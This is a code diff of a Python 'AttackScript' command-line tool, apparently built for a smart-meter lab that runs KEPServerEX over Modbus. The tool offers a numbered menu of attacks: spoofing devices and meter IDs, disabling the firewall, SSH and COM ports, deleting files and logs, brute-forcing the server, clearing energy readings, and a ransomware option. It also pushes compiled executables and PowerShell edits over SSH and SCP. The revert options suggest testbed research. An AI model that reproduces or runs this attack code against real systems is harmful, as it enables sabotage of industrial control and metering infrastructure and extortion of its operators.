+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": False}, user_group=usergroup))
 
     def kep_get_all_user_groups(self):  
         server = self.kep_connect()
@@ -1390,10 +866,9 @@ class AttackScript:
 
     def kep_modify_channel(self, channel_name, new_channel_name):  
         server = self.kep_connect()
-        print(connectivity.channel.modify_channel(server, {"common.ALLTYPES_NAME": new_channel_name},
-                                                  channel=channel_name, force=True))
+        print(connectivity.channel.modify_channel(server, {"common.ALLTYPES_NAME": new_channel_name}, channel=channel_name, force=True))
 
-    def kep_get_all_devices(self, channel):  # Example of a channel name is "SmartMeter"
+    def kep_get_all_devices(self, channel):
         server = self.kep_connect()
         print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))
 
@@ -1410,8 +885,7 @@ class AttackScript:
         print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel,
                                                                          {"common.ALLTYPES_NAME": device,
                                                                           "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial",
-                                                                          "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}),
-                                          indent=4))
+                                                                          "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
         print("\n" + json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
 
     def kep_delete_spoofed_device(self, channel, device):
@@ -1419,18 +893,14 @@ class AttackScript:
         device_to_del = ".".join([channel, device])
         print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))
 
-    def kep_modify_device(self, channel, device, new_device_name,
-                          device_id):  ### ADDED to change device ID to interrupt 
+    def kep_modify_device(self, channel, device, new_device_name, device_id): 
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
-        print(json.dumps(
-            connectivity.device.modify_device(server, device_to_get, {"common.ALLTYPES_NAME": new_device_name,
+        print(json.dumps(connectivity.device.modify_device(server, device_to_get, {"common.ALLTYPES_NAME": new_device_name,
                                                                       "servermain.DEVICE_ID_STRING": device_id,
-                                                                      "servermain.DEVICE_ID_HEXADECIMAL": int(
-                                                                          device_id),
+                                                                      "servermain.DEVICE_ID_HEXADECIMAL": int(device_id),
                                                                       "servermain.DEVICE_ID_DECIMAL": int(device_id),
-                                                                      "servermain.DEVICE_ID_OCTAL": int(device_id)},
-                                              force=True), indent=4))
+                                                                      "servermain.DEVICE_ID_OCTAL": int(device_id)}, force=True), indent=4))
 
     ## TAG FOR DEVICE
 
@@ -1449,15 +919,14 @@ class AttackScript:
         device_to_get = ".".join([channel, device])
         print(f"device_to_get={device_to_get}, name={name}, tag_address={tag_address}")
         print(json.dumps(connectivity.tag.add_tag(server, device_to_get, {"common.ALLTYPES_NAME": name,
-                                                                          "servermain.TAG_ADDRESS": tag_address}),
-                         indent=4))
+                                                                          "servermain.TAG_ADDRESS": tag_address}), indent=4))
 
     def kep_del_tag(self, channel, device, name): 
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, name])
         print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))
 
-    def kep_modify_tag(self, channel, device, name, new_name): # ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
+    def kep_modify_tag(self, channel, device, name, new_name):
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, name])
         print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True), indent=4))
@@ -1470,8 +939,7 @@ class AttackScript:
     def kep_add_udd_profile(self, profile_name, description):
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.add_profile(server, {"common.ALLTYPES_NAME": profile_name,
-                                                                       "common.ALLTYPES_DESCRIPTION": description}),
-                         indent=4))
+                                                                       "common.ALLTYPES_DESCRIPTION": description}), indent=4))
 
     def kep_delete_udd_profile(self, profile_name):
         server = self.kep_connect()
@@ -1484,15 +952,13 @@ class AttackScript:
     def kep_modify_udd_profile(self, profile_name, new_profile_name, description):
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": profile_name,
-                                                                          "common.ALLTYPES_DESCRIPTION": description}),
-                         indent=4))
+                                                                          "common.ALLTYPES_DESCRIPTION": description}), indent=4))
         print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name), indent=4))
         
     def kep_add_log_group(self, log_group, description):
         server = self.kep_connect()
         print(json.dumps(datalogger.log_group.add_log_group(server, {"common.ALLTYPES_NAME": log_group,
-                                                                     "common.ALLTYPES_DESCRIPTION": description}),
-                         indent=4))
+                                                                     "common.ALLTYPES_DESCRIPTION": description}), indent=4))
         
     def kep_delete_log_group(self, log_group):
         server = self.kep_connect()
@@ -1745,9 +1211,7 @@ class AttackScript:
         return results
 
     def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
-        """
-        # TODO: from self.ssh_run_command, uses the same ssh paramiko client. May need to cut the paramiko client connection to its own function, then both self.scp_transfer_file and self.ssh_run_command can use the same ssh paramiko client function
-
+        """   
         Transfer the a file remotely from host to destination machine.
 
         Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
@@ -1816,8 +1280,8 @@ class AttackScript:
             remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
         """
             
-        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
-        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
+        executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
+        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", self.SCRIPT_NAME], stdout=PIPE)
         print(compiled_exe_output)
 
         if remote_path is None:
@@ -1993,7 +1457,7 @@ class AttackScript:
 
         # Command to replace 'False' with 'True' in the file
         command_replace_false = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace 'False', 'True' | Set-Content -Path \"{command_output[:-1]}\"")
-        print("Replaced False with with True")
+        print("Replaced False with True")
 
         # Replace '0' with '1' in the file
         command_replace_zero = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
@@ -2010,17 +1474,15 @@ class AttackScript:
         match attack_option:
             case "start": self.kep_server_start()
             case "check": self.baudrate_check()
-            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH)  # TODO: Determine if this function is depricated or can be modified
-            # case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
+            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH)
             case "3":  self.disable_firewall(revert)
             case "4":  self.disable_ssh()
             case "5":  self.kep_server_stop(revert)
             case "6":  self.run_modinterrupt(revert)
             case "7":  self.disable_COMPort(revert)
-            case "8":  self.encrypt_files()
+            case "8":  self.Ransom(revert)
             case "9":  self.change_meterID(revert)
             case "10": self.clear_energy_reading()
-            case "11": self.revert(revert_option := str(argv[2])) # TODO: Completely depricate this by implementing most function with revert=False/True
             case "12": self.kep_bruteforce()
             case "13": self.baudrate_change(revert)
             case "14": self.smartmeter_get_hardware_info()
@@ -2039,17 +1501,11 @@ class AttackScript:
             case "27": self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
             case "28": self.kep_delete_log_files()
             case "29": self.kep_get_log_group("Derrick")
-            case "30": self.encrypt_files()
-            case "31": self.Ransom(revert)
-            case "32": self.revert_decrypt()
-            case "33": self.ChangeLogDataValue("2_1")
-            case _:
-                print("Invalid Attack Option! Use option \"-h\" for help!")
+            case "30": self.ChangeLogDataValue("2_1")
+            case _: print("Invalid Attack Option! Use option \"-h\" for help!")
 
 def main():
     class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawTextHelpFormatter):
-        # def __init__(self):
-        #     lambda prog: argparse.RawDescriptionHelpFormatter(prog, max_help_position=10)
         pass
     parser = argparse.ArgumentParser(prog="python AttackScript.py", description="CLI Attack Script for the SmartMeter laptop", formatter_class=CustomFormatter,
                                     epilog=textwrap.dedent('''
@@ -2074,7 +1530,7 @@ def main():
                             5  Disable Kepserver service
                             6  Interrupt modbus reading
                             7  Disable COM port
-                            8  Encrypt files
+                            8  Ransom
                             9  Change Meter25 Id to 26
                             10 Clear Energy Reading
                             11 Revert with options
@@ -2096,10 +1552,7 @@ def main():
                             27 Setup SSH Configuration and Keys
                             28 Delete KEP Log Files
                             29 Get Log Group
-                            30 Encrypt Files
-                            31 Ransom
-                            32 Decrypt Files
-                            33 Change Log Data Value
+                            30 Change Log Data Value
                         '''))
 
     # Optional Arguments
@@ -2110,10 +1563,10 @@ def main():
                             5  Enable Kepserver service
                             6  Remove modbus reading interruption
                             7  Enable COM port
+                            8  Decrypt Ransomware
                             9  Change Meter26 Id back to 25
                             13 Change baudrate back to standard 9600
                             20 Enable running schedules
-                            31 Decrypt Ransomware
                         '''))
     parser.add_argument("--ip", dest="ip_address", metavar="ip_address", default="172.16.2.223", help="Specify the ip address.")
     
